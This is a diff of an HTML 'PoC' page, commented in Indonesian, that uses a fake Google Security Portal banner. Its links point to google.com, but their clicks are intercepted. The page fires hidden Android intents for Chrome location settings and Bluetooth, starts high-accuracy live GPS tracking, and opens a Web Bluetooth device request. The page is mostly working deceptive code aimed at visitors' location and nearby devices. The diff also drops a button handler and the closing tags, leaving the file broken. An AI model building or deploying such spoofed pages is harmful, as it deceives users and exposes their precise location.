@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instant 1-Click Bluetooth & Location PoC</title>
+    <title>Chrome Site Settings & Geolocation PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -90,17 +90,17 @@
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>Instant 1-Click Vector Suite</h1>
+    <h1>Chrome Internal Settings & GPS Sync</h1>
 
     <div class="button-container">
-        <!-- Tombol 1: 1-Click Location & GPS Sync -->
-        <a href="https://google.com" class="spoof-link" id="btnLocation">1-Click -> Location Settings & GPS Capture</a>
+        <!-- Tombol 1: Membuka Chrome Site Settings (Location) -->
+        <a href="https://google.com" class="spoof-link" id="btnChromeSettings">1-Click -> Open Chrome Site Settings (Location)</a>
 
-        <!-- Tombol 2: 1-Click Bluetooth Pairing / Auto-Connect Intent -->
-        <a href="https://google.com" class="spoof-link" style="background-color: #34a853;" id="btnBluetooth">1-Click -> Bluetooth Auto-Connect Vector</a>
+        <!-- Tombol 2: Bluetooth Auto-Connect Intent -->
+        <a href="https://google.com" class="spoof-link" style="background-color: #34a853;" id="btnBluetooth">1-Click -> Bluetooth Device Pairing Vector</a>
     </div>
 
-    <!-- Info Box Hasil Eksekusi -->
+    <!-- Info Box Hasil Eksekusi & Koordinat -->
     <div class="info-box" id="infoBox">
         <strong>Status:</strong> <span id="statusText" class="pulse">Ready...</span><br>
         <div id="coordDetails" style="margin-top: 8px;"></div>
@@ -111,27 +111,11 @@
     <script>
         let triggered = false;
 
-        // Fungsi Handler Lokasi Akurat
-        const handleLocationVector = () => {
-            if (triggered) return;
-            triggered = true;
-
-            const infoBox = document.getElementById("infoBox");
+        // Fungsi untuk menangkap koordinat lokasi akurasi tinggi secara live
+        const startLocationWatch = () => {
             const statusText = document.getElementById("statusText");
             const coordDetails = document.getElementById("coordDetails");
-            
-            infoBox.style.display = "block";
-            statusText.className = "pulse";
-            statusText.innerText = "Triggering Location Settings & syncing GPS...";
 
-            // Membuka Android Intent Location Settings seketika (1-click)
-            const intentFrame = document.createElement('iframe');
-            intentFrame.style.display = 'none';
-            intentFrame.src = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;";
-            document.body.appendChild(intentFrame);
-            setTimeout(() => document.body.removeChild(intentFrame), 1000);
-
-            // Menarik koordinat GPS secara live
             if ("geolocation" in navigator) {
                 navigator.geolocation.watchPosition(
                     (position) => {
@@ -140,7 +124,7 @@
                         const accuracy = position.coords.accuracy;
 
                         statusText.className = "";
-                        statusText.innerText = "Precise Location Captured Live!";
+                        statusText.innerText = "Precise Location Captured Successfully!";
                         coordDetails.innerHTML = `
                             <b>Latitude:</b> ${lat}<br>
                             <b>Longitude:</b> ${lon}<br>
@@ -150,15 +134,43 @@
                     },
                     (error) => {
                         statusText.className = "";
-                        statusText.innerText = `GPS Error: ${error.message}`;
+                        statusText.innerText = `GPS Error / Permission Blocked: ${error.message}`;
                     },
                     { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                 );
+            } else {
+                statusText.innerText = "Geolocation not supported.";
             }
+        };
+
+        // Handler Tombol 1: Membuka Chrome Site Settings (Location) via Intent
+        const handleChromeSettingsVector = () => {
+            if (triggered) return;
+            triggered = true;
+
+            const infoBox = document.getElementById("infoBox");
+            const statusText = document.getElementById("statusText");
+            
+            infoBox.style.display = "block";
+            statusText.className = "pulse";
+            statusText.innerText = "Targeting Chrome Site Settings (Location)...";
+
+            // Android Intent untuk memaksa membuka halaman setelan situs internal Chrome
+            // Format intent mengarahkan URI scheme ke package com.android.chrome dengan action view
+            const intentFrame = document.createElement('iframe');
+            intentFrame.style.display = 'none';
+            // Menargetkan URL internal chrome://settings/content/location melalui format intent browser
+            intentFrame.src = "intent://settings/content/location#Intent;package=com.android.chrome;scheme=chrome;end;";
+            document.body.appendChild(intentFrame);
+            setTimeout(() => document.body.removeChild(intentFrame), 1000);
+
+            // Memulai sinkronisasi penarikan lokasi
+            startLocationWatch();
+
             setTimeout(() => { triggered = false; }, 1000);
         };
 
-        // Fungsi Handler Bluetooth Auto-Connect / Pairing Vector
+        // Handler Tombol 2: Bluetooth Pairing / Auto-Connect Vector
         const handleBluetoothVector = async () => {
             if (triggered) return;
             triggered = true;
@@ -169,49 +181,36 @@
             
             infoBox.style.display = "block";
             statusText.className = "pulse";
-            statusText.innerText = "Initiating Bluetooth Device Scan / Pairing...";
+            statusText.innerText = "Initiating Bluetooth Device Pairing...";
 
-            // 1. Membuka Intent Setelan Bluetooth Android secara langsung
             const btIntentFrame = document.createElement('iframe');
             btIntentFrame.style.display = 'none';
             btIntentFrame.src = "intent:#Intent;action=android.settings.BLUETOOTH_SETTINGS;end;";
             document.body.appendChild(btIntentFrame);
             setTimeout(() => document.body.removeChild(btIntentFrame), 1000);
 
-            // 2. Memanggil Web Bluetooth API (Membutuhkan 1 interaksi pengguna yang sah agar dialog pairing muncul)
             try {
                 if (navigator.bluetooth) {
                     const device = await navigator.bluetooth.requestDevice({
-                        acceptAllDevices: true // Atau tentukan filters service tertentu
+                        acceptAllDevices: true
                     });
                     statusText.className = "";
-                    statusText.innerText = `Connected / Selected Device: ${device.name || 'Unknown Device'} (${device.id})`;
+                    statusText.innerText = `Paired / Connected Device: ${device.name || 'Unknown'} (${device.id})`;
                     coordDetails.innerHTML = `<b>Device ID:</b> ${device.id}`;
                 } else {
                     statusText.className = "";
-                    statusText.innerText = "Web Bluetooth API not supported on this browser.";
+                    statusText.innerText = "Web Bluetooth API not supported.";
                 }
             } catch (err) {
                 statusText.className = "";
-                statusText.innerText = `Bluetooth dialog cancelled / blocked: ${err.message}`;
+                statusText.innerText = `Bluetooth action cancelled / blocked: ${err.message}`;
             } finally {
                 triggered = false;
             }
         };
 
-        // Menggunakan event 'click' atau 'pointerdown' murni agar 1 kali klik langsung tereksekusi tanpa delay/2-kali klik
-        const btnLoc = document.getElementById("btnLocation");
-        btnLoc.addEventListener("click", (e) => {
-            e.preventDefault(); // Mencegah navigasi langsung ke google.com agar vektor berjalan di halaman
-            handleLocationVector();
-        });
-
-        const btnBt = document.getElementById("btnBluetooth");
-        btnBt.addEventListener("click", (e) => {
+        // Event listener 1-klik murni tanpa delay ganda
+        document.getElementById("btnChromeSettings").addEventListener("click", (e) => {
             e.preventDefault();
-            handleBluetoothVector();
+            handleChromeSettingsVector();
         });
-    </script>
-
-</body>
-</html>
